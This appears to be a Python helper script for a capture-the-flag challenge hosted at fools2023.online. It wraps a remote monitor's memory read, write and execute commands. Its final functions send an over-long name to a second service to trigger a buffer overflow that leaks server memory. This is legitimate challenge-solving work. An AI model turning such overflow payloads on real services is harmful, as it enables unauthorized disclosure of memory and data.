# pylint: disable=global-statement,invalid-name,unused-import
import socket
import select
import builtins
import re
import string
from assemble import assemble_inline

con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


class ConnectionClosedException(Exception):
    pass


def connect():
    global con
    if con:
        con.close()
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.connect(("fools2023.online", 13337))
    read_all_poss(timeout=3)


echoing = True


def read_all_poss(timeout=3, subsequent_timeout=2, expected_end="Ready.\n> "):
    if expected_end is None:
        expected_end = "Ready.\n> "
    global con
    if not con:
        raise ConnectionClosedException("Connection closed")
    out = ""
    while True:
        ready_read, _ready_write, in_err = select.select([con], [], [con], timeout)
        if in_err:
            raise ConnectionClosedException("Socket error when reading", in_err)
        if ready_read:
            rcvd_chunk = con.recv(1024)
            if rcvd_chunk == b'':  # eof
                con = None
                raise ConnectionClosedException("EOF", out)
            rcvd_str = rcvd_chunk.decode('utf8', 'replace')
            if echoing:
                print(rcvd_str, end="")
            out += rcvd_str
            if out.endswith(expected_end):
                break
        else:
            break
        timeout = subsequent_timeout
    return out


connect()


def send(msg, timeout=2, expected_end=None):
    if not con:
        raise ConnectionClosedException()
    if isinstance(msg, str):
        msg = bytes(msg, "utf8")
    assert isinstance(msg, bytes)
    if msg[-1] != b'\n'[0]:
        print("Warning: Non-terminated msg", msg)
    tot_sent = 0
    while tot_sent < len(msg):
        sent = con.send(msg[tot_sent:])
        if sent == 0:
            raise ConnectionClosedException("Socket error when writing", con)
        tot_sent += sent
    if echoing:
        print(msg.decode("utf8", errors="replace"), end="")
    return read_all_poss(timeout=timeout, subsequent_timeout=timeout, expected_end=expected_end)


builtin_hex = builtins.hex


def my_hex(num, padding=2):
    if isinstance(num, str):
        num = num.replace(" ", "").replace("\n", "")
        assert re.fullmatch(r'[0-9a-fA-F]+', num)
        return num
    return f"{num:0{padding}X}"


#pylint: disable=redefined-builtin
hex = my_hex


def fromhex(num):
    return int(num, 16)


def expect_prompt_and_ready_suffix(prompt, res):
    res = expect_prompt(prompt, res)
    suffix = "Ready.\n> "
    if not res.endswith(suffix):
        raise Exception("Expected ready suffix", res)
    res = res[:-len(suffix)]
    return res


def expect_prompt(prompt, res):
    if not res.startswith(prompt):
        raise Exception("Expected prompt", prompt, res)
    res = res[len(prompt):]
    return res


def read_mem_raw(addr, lines=5):
    raw = send(f"r\n{hex(addr)}\n{hex(lines)}\n")
    raw = expect_prompt_and_ready_suffix("> Which address? > How many lines? ", raw)
    return raw.splitlines()


def read_mem(addr, lines=None, nbytes=None, pretty_dump=None):
    if lines is not None and nbytes is not None:
        raise Exception("Don't use both lines and nbytes")
    if nbytes is not None:
        if pretty_dump is None:
            pretty_dump = False
        lines = (nbytes-1) // 8 + 1
    else:
        if lines is None:
            lines = 5
        if pretty_dump is None:
            pretty_dump = True
        if nbytes is None:
            nbytes = lines*8

    assert lines is not None and nbytes is not None

    raw = read_mem_raw(addr, lines)
    if pretty_dump:
        print()
    raw_bytes = []
    for line in raw:
        printable_no_ws = set(string.printable) - set(string.whitespace)
        addr, memline = line.split(" | ")
        mem = memline.split()
        chrs = ""
        for b in mem:
            b = fromhex(b)
            c = chr(b)
            raw_bytes.append(b)
            if c in printable_no_ws:
                chrs += c
            elif b == 0:
                chrs += " "
            else:
                chrs += "."
        if pretty_dump:
            print(f"{addr} | {memline.strip()} | {chrs}")
    return bytes(raw_bytes)[:nbytes]


def print_mem(addr):
    res = send(f"p\n{hex(addr)}\n")
    res = expect_prompt_and_ready_suffix("> Which address? ", res)
    return res


def write_mem(addr, data):
    data = hex(data)
    data_ = ""
    for i, c in enumerate(data):
        data_ += c
        if i % 64 == 0:
            data_ += "\n"
    res = send(f"w\n{hex(addr)}\n{data_}.\n")
    res = expect_prompt_and_ready_suffix('> Which address? > Enter hex data. End with dot "." + newline:\n', res)
    assert res == "Loaded.\n", res


def clear_mem(addr, num=0x100):
    write_mem(addr, "00"*num)


def exec_mem(addr):
    res = send(f"x\n{hex(addr)}\ny\n")
    res = expect_prompt(f"> Which address? > Really exec at {hex(addr, padding=4)}? Type Y if so:", res)
    return res


def exec_data(code, addr=0x2000):
    write_mem(addr, code)
    return exec_mem(addr)


file_data = """
BLK  SIZE  NAME
=======================
07   01F9  TODO.TXT
08   0560  REPORT03.PRG
0A   02B1  MATHTEST.PRG"""


def filesize(filename):
    for rec in file_data.splitlines()[3:]:
        _blk, size, name = rec.split()
        if name == filename:
            return fromhex(size)
    raise Exception("File not found", filename)


def read_file_to_mem(filename, addr=0x2000):
    _size = filesize(filename)
    res = send(f"rf\n{filename}\n{hex(addr)}\n")
    res = expect_prompt_and_ready_suffix("> Filename? > Which address? ", res)
    assert res == "Loaded.\n", res


def read_file(filename, addr=0x2000, pretty_dump=True):
    read_file_to_mem(filename, addr)
    return read_mem(addr, nbytes=filesize(filename), pretty_dump=pretty_dump)


def print_file(filename, addr=0x2000):
    read_file_to_mem(filename, addr)
    return print_mem(addr)


def exec_file(filename, addr=0x2000):
    read_file_to_mem(filename, addr)
    return exec_mem(addr)


def test_comparisons(code, addr=0x2000):
    for pre, msg in ("10beefa2beef", "LHS=RHS"), ("10beefa2beee", "LHS>RHS"), ("10beefa2befe", "LHS<RHS"):
        print(f"\n\n{msg}\n")
        exec_data(pre+code, addr)


def connect_server3():
    global con
    if con:
        con.close()
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    con.connect(("fools2023.online", 13339))
    read_all_poss(timeout=3, expected_end="(max 15 characters): ")


def bytes_(x):
    if isinstance(x, str):
        return bytes(x, "utf8")
    else:
        return bytes(x)


def overflow_server3(data, base=b"abcdefghijklmno"):
    connect_server3()
    out = ""
    try:
        out += send(bytes_(base) + bytes_(data) + b"\n", expected_end=" to leave: ", timeout=10)
        out += send("q\n", timeout=10, expected_end=" to leave: ")
    except ConnectionClosedException as e:
        if len(e.args) >= 2 and e.args[0] == "EOF":
            out += e.args[1]
    return out


def read_serv3_mem(base_addr):
    name = []
    for i in range(4):
        name.append(0xF0)
        addr = base_addr + i*2
        name.append(addr % 256)
        name.append(addr >> 8)

    resp = overflow_server3("", base=name)

    resp_name = re.findall(r"Welcome, (.{16})", resp)[0]

    out = []

    for i in range(0, 16, 4):
        mem = fromhex(resp_name[i:i+4])
        out.append(mem % 256)
        out.append(mem >> 8)

    return out
